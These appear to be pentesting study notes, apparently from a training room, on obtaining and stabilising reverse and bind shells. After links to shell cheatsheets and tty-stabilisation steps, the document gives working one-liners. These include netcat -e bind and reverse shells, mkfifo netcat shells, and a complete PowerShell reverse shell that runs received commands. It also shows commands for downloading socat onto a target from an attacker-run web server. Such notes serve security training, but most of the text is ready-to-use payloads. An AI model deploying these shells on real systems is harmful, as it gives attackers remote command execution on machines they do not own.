- Netcat
- socat
- msfvenom


- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Pentest Monkey [Reverse Sheel Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


### Netcat shell stabilization
- Technique 1: Python (Linux only)
1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm -- this will give us access to commands such as clear
3. background the shell (ctrl + z)
  - stty raw -echo; fg

        - if the shell dies - no iput will be visible on your own, since echo is disabled - ***reset*** - and press enter

- Technique 2: rlwrap (not installed on kali by default)
1. sudo apt install rlwrap
  - rlwrap nc -lvnp <p>
  - stty raw -echo: fg

- Technique 3: Socat (linux targets only)
1. sudo python3 -m http.server 80
2. wget <local-ip>/socat -O /tmp/socat
3. Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

------
With any of the shell use the below to adjust the tty size

- stty - a
- stty rows <number>
- stty cols <number>

### Common Shell Payloads

A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the **nc.exe** Windows version included with Kali at **/usr/share/windows-resources/binaries**, and the version used in Kali itself: **netcat-traditional**) there is a **-e** option which allows you to execute a process on connection. For example, as a listener:

- nc -lvnp <PORT> -e /bin/bash

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with **nc <LOCAL-IP> <PORT> -e /bin/bash** would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

- mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

A very similar command can be used to send a netcat reverse shell:

- mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

- powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"